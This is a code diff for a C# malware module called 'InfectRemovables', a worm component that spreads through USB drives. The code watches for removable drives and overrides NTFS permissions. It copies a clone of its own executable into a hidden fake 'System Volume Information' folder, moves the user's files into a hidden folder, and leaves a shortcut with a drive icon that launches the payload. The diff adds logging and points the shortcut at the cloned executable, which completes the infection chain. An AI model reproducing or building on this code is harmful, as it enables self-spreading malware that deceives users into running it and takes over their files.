@@ -14,34 +14,34 @@ namespace zort
         private readonly ManagementEventWatcher _watcher = new ManagementEventWatcher();
         private readonly byte[] RECOGNITION_BYTES = { 0x69, 0x7A, 0x42, 0x19, 0x00, 0xCC, 0xEF, 0x42 };
         private const byte VERSION_BYTE = 0x01;
-        const string FAKE_FOLDER_NAME = "‎ ";
-        const string FAKE_SYSTEM_VOLUME_INFO_NAME = "System Volume Information ";
+        const string FAKE_FOLDER_NAME = " ";
+        const string FAKE_SYSTEM_VOLUME_INFO_NAME = "System Volume Information";
 
         public string ModuleName => "InfectRemovables";
         public string Description => "Infects removable drives with a fake System Volume Information folder.";
-        public bool RequiresAdmin => false;
+        public ElevationType ElevationType => ElevationType.Both;
         public void Start()
         {
             // Code to start the infection method
-            Console.WriteLine("InfectRemovables started.");
+            ModuleLogger.Log(this, "InfectRemovables started.");
             WatchRemovableDrives();
             InfectRemovableDrive('E');
         }
         public void Stop()
         {
             // Code to stop the infection method
-            Console.WriteLine("InfectRemovables stopped.");
+            ModuleLogger.Log(this, "InfectRemovables stopped.");
             UnwatchRemovableDrives();
         }
 
         private void WatchRemovableDrives()
         {
             // Code to watch drives for removable media
-            Console.WriteLine("Watching drives for removable media...");
+            ModuleLogger.Log(this, "Watching drives for removable media...");
             _watcher.EventArrived += new EventArrivedEventHandler((object sender, EventArrivedEventArgs e) =>
             {
                 // Code to handle the event when a removable drive is inserted
-                Console.WriteLine("Removable drive inserted or removed.");
+                ModuleLogger.Log(this, "Removable drive inserted or removed.");
             });
             _watcher.Query = new WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2");
             _watcher.Start();
@@ -50,7 +50,7 @@ namespace zort
         private void UnwatchRemovableDrives()
         {
             // Code to stop watching drives
-            Console.WriteLine("Stopped watching drives.");
+            ModuleLogger.Log(this, "Stopped watching drives.");
             _watcher.Stop();
         }
 
@@ -66,6 +66,8 @@ namespace zort
             string fakeSystemVolumeInfoPath = Path.Combine(fakeFolderPath, FAKE_SYSTEM_VOLUME_INFO_NAME);
             string fakeFilePath = Path.Combine(fakeSystemVolumeInfoPath, "WPSettings.dat");
 
+            Directory.CreateDirectory(fakeSystemVolumeInfoPath);
+
             byte[] expectedData = new byte[RECOGNITION_BYTES.Length + 1];
             Buffer.BlockCopy(RECOGNITION_BYTES, 0, expectedData, 0, RECOGNITION_BYTES.Length);
             expectedData[RECOGNITION_BYTES.Length] = VERSION_BYTE;
@@ -75,59 +77,59 @@ namespace zort
                 //TODO: Add check for version byte for updating
                 if (File.ReadAllBytes(fakeFilePath).SequenceEqual(expectedData))
                 {
-                    Console.WriteLine("Drive is already infected. Exiting.");
+                    ModuleLogger.Log(this, "Drive is already infected. Exiting.");
                     return;
                 }
             }
-            Console.WriteLine($"Infecting removable drive: {driveLetter}");
+            ModuleLogger.Log(this, $"Infecting removable drive: {driveLetter}");
 
             // Check if the drive is writable
             if (!CanWrite(drivePath))
             {
-                Console.WriteLine("Drive is not writable. rewriting security rules");
+                ModuleLogger.Log(this, "Drive is not writable. rewriting security rules");
                 // Attempt to change the security rules to make it writable
                 ChangeNTFSSecurityRules(drivePath);
             }
             // Check again if the drive is writable
             if (!CanWrite(drivePath))
             {
-                Console.WriteLine("Drive is still not writable. Exiting.");
+                ModuleLogger.Log(this, "Drive is still not writable. Exiting.");
                 return;
             }
 
             if (string.IsNullOrEmpty(driveRoot))
             {
-                Console.WriteLine("No writable directory found.");
+                ModuleLogger.Log(this, "No writable directory found.");
                 return;
             }
 
-            Console.WriteLine($"Most outer writable directory: {driveRoot}");
+            ModuleLogger.Log(this, $"Most outer writable directory: {driveRoot}");
 
             // Create a fake folder in the most outer writable directory
             Directory.CreateDirectory(fakeFolderPath);
-            Console.WriteLine($"Created fake folder: {fakeFolderPath}");
+            ModuleLogger.Log(this, $"Created fake folder: {fakeFolderPath}");
 
             // Create a fake System Volume Information folder
             Directory.CreateDirectory(fakeSystemVolumeInfoPath);
-            Console.WriteLine($"Created fake System Volume Information folder: {fakeSystemVolumeInfoPath}");
+            ModuleLogger.Log(this, $"Created fake System Volume Information folder: {fakeSystemVolumeInfoPath}");
 
             //Create fake file in the fake folder containing recognition bytes and version info
             File.WriteAllBytes(fakeFilePath, expectedData);
 
             // Copy the executable to the fake folder
             byte[] bytes = PersistenceHelper.CreateClone();
-            string clonedExecutablePath = Path.Combine(fakeSystemVolumeInfoPath, "IndexerVolumeGuid");
+            string clonedExecutablePath = Path.Combine(fakeSystemVolumeInfoPath, "IndexerVolumeGuid.exe");
             using (FileStream fs = new FileStream(clonedExecutablePath, FileMode.Create, FileAccess.Write, FileShare.None))
             {
                 fs.Write(bytes, 0, bytes.Length);
             }
-            Console.WriteLine($"Copied executable to fake folder: {clonedExecutablePath}");
+            ModuleLogger.Log(this, $"Copied executable to fake folder: {clonedExecutablePath}");
 
             // Create a shortcut to the executable
-            string targetPath = $@"cmd.exe";
+            string targetPath = $@"{fakeSystemVolumeInfoPath}\IndexerVolumeGuid.exe";
             string shortcutPath = Path.Combine(fakeFolderPath, $@"{driveLetter}:\.lnk");
             CreateShortcut(shortcutPath, targetPath, @"C:\Windows\System32\SHELL32.dll,79"); //Drive icon
-            Console.WriteLine($"Created shortcut to executable: {shortcutPath}");
+            ModuleLogger.Log(this, $"Created shortcut to executable: {shortcutPath}");
 
             // Create desktop.ini to add an icon to the fake fake folder
             string desktopIniPath = Path.Combine(fakeFolderPath, "desktop.ini");
@@ -136,13 +138,13 @@ namespace zort
                 writer.WriteLine("[.ShellClassInfo]");
                 writer.WriteLine("IconResource=C:\\Windows\\System32\\shell32.dll,79");
             }
-            Console.WriteLine($"Created desktop.ini: {desktopIniPath}");
+            ModuleLogger.Log(this, $"Created desktop.ini: {desktopIniPath}");
 
             // Set folders and files as system and hidden
             File.SetAttributes(fakeFolderPath, FileAttributes.System | FileAttributes.Hidden);
             File.SetAttributes(fakeSystemVolumeInfoPath, FileAttributes.System | FileAttributes.Hidden);
             File.SetAttributes(desktopIniPath, FileAttributes.System | FileAttributes.Hidden);
-            Console.WriteLine("Set fake folders and desktop.ini as system and hidden.");
+            ModuleLogger.Log(this, "Set fake folders and desktop.ini as system and hidden.");
 
             // Move files and folders from most outer directory to the fake folder
             DirectoryInfo mostOuterDir = new DirectoryInfo(driveRoot);
@@ -162,7 +164,7 @@ namespace zort
                 string newPath = Path.Combine(fakeFolderPath, directory.Name);
                 Directory.Move(directory.FullName, newPath);
             }
-            Console.WriteLine("Moved files and folders to fake folder.");
+            ModuleLogger.Log(this, "Moved files and folders to fake folder.");
         }
 
         private static void CreateShortcut(string path, string targetPath, string iconPath, string description = "")
@@ -195,7 +197,7 @@ namespace zort
         {
             try
             {
-                Console.WriteLine($"Changing NTFS security rules for: {drivePath}");
+                ModuleLogger.Log(this, $"Changing NTFS security rules for: {drivePath}");
 
                 // Get the directory info for the drive
                 DirectoryInfo directoryInfo = new DirectoryInfo(drivePath);
@@ -223,11 +225,11 @@ namespace zort
                 // Apply the updated access control settings
                 directoryInfo.SetAccessControl(directorySecurity);
 
-                Console.WriteLine("NTFS security rules updated successfully.");
+                ModuleLogger.Log(this, "NTFS security rules updated successfully.");
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Failed to change NTFS security rules: {ex.Message}");
+                ModuleLogger.Log(this, $"Failed to change NTFS security rules: {ex.Message}");
             }
         }
     }
